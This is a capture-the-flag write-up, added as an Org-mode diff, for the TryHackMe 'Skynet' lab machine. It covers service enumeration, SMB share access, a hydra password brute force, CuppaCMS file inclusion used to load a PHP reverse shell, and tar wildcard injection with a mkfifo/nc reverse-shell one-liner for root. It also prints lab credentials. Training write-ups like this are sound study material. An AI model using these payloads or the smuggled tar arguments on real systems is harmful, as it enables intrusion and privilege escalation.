@@ -1,0 +1,285 @@
+#+TITLE: Sigh...Hasta La Vista: THM: Skynet
+#+DATE: <2023-12-15 11:32>
+#+DESCRIPTION: 
+#+FILETAGS: 
+
+Yesterday I lost the opportunity to use "I'll be back" on my post's
+title. Unfortunate but I had not see ~Skynet~ in the list of my TODO
+rooms.
+
+* Reconnaissance
+Start by updating ~/etc/hosts~ and ~.bashrc~, to save yourself some time.
+
+ #+NAME: Update hosts and bashrc
+ #+begin_src bash
+ echo "10.10.201.239  skynet.thm" >> /etc/hosts
+ echo "IP=skynet.thm" >> ~/.bashrc
+ #+end_src
+
+
+** Port Scanning
+The usual CTF-oriented nmap quick scan revealed quite a lot of open
+ports in the target machine:
+- [ ] 22: SSH
+- [ ] 80: HTTP webserver
+- [ ] 110: pop3: Dovecot pop3d
+  - POP3 mail server
+- [ ] 139: Samba (3.X-4.X)
+- [ ] 143: imap: Dovecot imapd
+- [ ] 445: Samba 4.3.11 
+
+I started the full scan, just to be thorough enough, but we had enough
+data to get going
+#+NAME: Initial nmap scan
+#+begin_src bash
+nmap -sV -sC -oN nmap.initial $IP
+nmap -p- -oN nmap.full -T4 $IP
+#+end_src
+
+** Understanding target ports
+** Website
+The webserver strangely looks like a search engine, and it does not
+produce any results to the random strings I tried.  
+
+#+caption: Homepage
+[[file:images/Reconnaissance/20231215_114140_screenshot.png]]
+
+*** Directory Enumeration with gobuster
+Seeing that I was unable to get any promising information manually, I
+did not lose any more time, before launching gobuster:
+
+#+NAME: Gobuster with IP and default path
+#+begin_src bash
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$IP -o gobuster.big
+#+end_src
+
+Whih, in turn, gave us some directories to check:
+#+begin_example
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/ai (Status: 301)
+/config (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/server-status (Status: 403)
+/squirrelmail (Status: 301)
+#+end_example
+
+While most of these show up as forbidden, *squirrelmail* is promising:
+
+#+caption: SquirrelMail Login page
+[[file:images/Reconnaissance/20231215_114714_screenshot.png]]
+
+
+Sadly *searchsploit* did not reveal any usable exploits for that version
+(had it been for 1.4.22, we would have a perfectly fine RCE...shame)
+
+** Samba enumeration
+Just from what we have seen already, we do not have any credentials or
+information about the users of this machine. Putting web analysis and
+enumeration on hold for Samba might be the right move to make:
+
+#+caption: Nmap samba info
+[[file:images/Reconnaissance/20231216_125505_screenshot.png]]
+
+I'm thinking of using ~smbclient~ and if that does not get us anywhere
+~enum4linux~ to get some more information about the shares available
+
+Smbclient does a pretty decent job:
+#+NAME: Smbclient share enumeration
+#+begin_src bash
+smbclient -L $IP -U guest
+#+end_src
+
+ #+caption: Shares on target samba
+ [[file:images/Reconnaissance/20231216_125934_screenshot.png]]
+
+Now it would be interesting to connect to any of those shares (except
+for print actually):
+- [ ] anonymous might be the only one not password protected
+- [ ] milesdyson might gives us some more information about the user
+- [ ] IPC might have some interesting files for us (perhaps a path to
+  gain initial foothold or privilege escalation later on)
+ 
+**** Anonymous
+ #+NAME: Connect to anonymous smb share
+ #+begin_src bash
+smbclient //$IP/anonymous -U guest
+ #+end_src
+
+Not much here:
+- An ~attention.txt~ file, simply pointing at a /recent system
+  malfunction/.
+- A log subdirectory containing:
+  - ~log1.txt~: Looks like a wordlist - maybe checking it with hydra
+    against the login prompt (or the samba share / ssh server maybe) with
+    ~milesdyson~ (?)
+  - ~log{2,3}.txt~: empty files
+
+**** Milesdyson
+#+NAME: Connect to anonymous smb share
+#+begin_src bash
+smbclient //$IP/milesdyson -U guest
+#+end_src
+
+Access denied - can't login here as ~milesdyson~.
+
+** Testing the wordlist
+- The given wordlist proved useless for ssh login
+- Testing the wordlist on the mail entrypoint was a good choice : we
+  got miles password
+  
+#+NAME: Hydra bruteforcing mail
+#+begin_src bash
+hydra -l milesdyson -P log1.txt $IP http-post-form "/squirrelmail/src/redirect.php: login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:incorrect"
+#+end_src
+
+#+begin_comment
+cyborg007haloterminator
+#+end_comment
+
+** Checking the mail
+Using the newly found password, we can try to see if there is any
+useful information in the user's email account:
+
+*** Password rEsEt
+#+caption: Lo and Behold
+[[file:images/Reconnaissance/20231216_131629_screenshot.png]]
+
+#+begin_comment
+)s{A&2Z=F^n_E.B`
+#+end_comment
+
+*** Yeah don't know about that
+In another mail, we get this binary sequence, which given its
+structure suggests the usage of a binary to ASCII converter: The final
+text makes *absolutely* no sense:
+
+#+begin_example
+balls have zero to me to me to me to me to me to me to me to me to
+#+end_example
+
+#+caption: Peculiar, obfuscated hexdump
+#+DOWNLOADED: screenshot @ 2023-12-16 13:17:54
+[[file:images/Reconnaissance/20231216_131754_screenshot.png]]
+
+After viewing the last email, the "hexdump" from above seems to be a
+line from a song (?) - Nah. Searching for it online it *interestingly*
+points to an incident in Facebook Artificial Intelligence lab: [[https://languagelog.ldc.upenn.edu/nll/?p=33355][see
+here]]
+
+
+** Going back to the samba shares
+#+NAME: Connect to milesdyson smb share as milesdyson
+#+begin_src bash
+smbclient //$IP/milesdyson -U milesdyson
+#+end_src
+
+In this share there are some machine/deep learning related pdfs, a
+wide set of markdown notes on these topics (might be worth checking
+out :P), and a file titled ~important.txt~. *Sigh* I mEaN wHeRe sHoUlD I
+gO nOw?
+
+#+caption: Important.txt
+[[file:images/Reconnaissance/20231216_132530_screenshot.png]]
+
+
+#+begin_comment
+/45kra24zxs28v3yd
+#+end_comment
+
+** Checking the CMS
+#+begin_comment
+http://skynet.thm/45kra24zxs28v3yd/administrator/
+#+end_comment
+There seems to be a personal webpage at the new link we found out
+about. Again, enumeration is due:
+- ~/administrator~ gets found by gobuster
+
+#+NAME: Gobuster with IP and default path
+#+begin_src bash
+gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$IP/45kra24zxs28v3yd -o gobuster.big
+#+end_src
+
+Visiting ~/admiinistrator~ we get to a login page of *CuppaCMS*:
+
+#+caption: Login page of Cuppa
+[[file:images/Reconnaissance/20231216_132854_screenshot.png]]
+
+My first thought was to check the password we had found for the email,
+however, my lazy me thought: /Too manual/, check for exploits first.
+Apparently there is a readily available exploit in exploit-db: 25971.
+
+* Exploitation
+** CuppaCMS
+Using the following payload, as described in the exploit we found, we
+see that there is:
+1. LFI potential (we could maybe get a flag through that (?))
+2. PHP injection potential (a reverse shell might be nice as well)
+
+#+begin_example
+http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+#+end_example
+
+*** Generating a php reverse shell and hosting it
+I always like using [[https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php][this]] as my go-to php shell so there was not much
+to do:
+ #+NAME: Fixing the php rev shell
+ #+begin_src bash
+ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+ vim php-reverse-shell.php
+ python3 -m http.server
+ nc -lvnp 6969 # do not forget the listener
+ #+end_src
+
+Then, manipulating the ~urlConfig~ parameter once again we forge a
+request:
+#+begin_example
+http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.95.44:8000/php-reverse-shell.php
+#+end_example
+
+This successfully gives us an entrypoint!
+
+* Privilege Escalation - Lateral Movement
+Before doing anything else, make the shell more usable:
+ #+NAME: Usability
+ #+begin_src bash
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
+ #+end_src
+
+** www-data
+We can move to miles home directory and get the user flag, but there
+are some more interesting files there as well:
+- share: the samba share that we have already checked
+- backups.sh: i'm thinking that this will be the way to get access as
+  another user: a crontab must be running and while the file itself is
+  not readily exploitable by us (not writeable), we can manipulate its
+  options
+
+* Getting Root: Tar wildcards
+I have seen this exploit before so I know that by creating the right
+set of files, this line can result to either the creation of a SUID
+shell file for us, or to another reverse shell. For the shake of
+simplicity, I will go the second route.[fn:1]
+
+#+begin_example
+tar cf /home/milesdyson/backups/backup.tgz *
+#+end_example
+
+Initially I had opted for a different route but, for some reason I
+could not create the checkpoint action file. Creating a /payload/ file
+with the command, I changed my approach to the following: 
+
+#+NAME: Create files
+#+begin_src bash
+echo ''>  '--checkpoint=1'
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.95.44 6970 >/tmp/f' > shell.sh
+echo "" > "--checkpoint-action=exec=bash shell.sh"
+#+end_src
+
+
+
+* Footnotes
+
+[fn:1] In fact: source: https://www.sevenlayers.com/index.php/353-exploiting-tar-wildcards
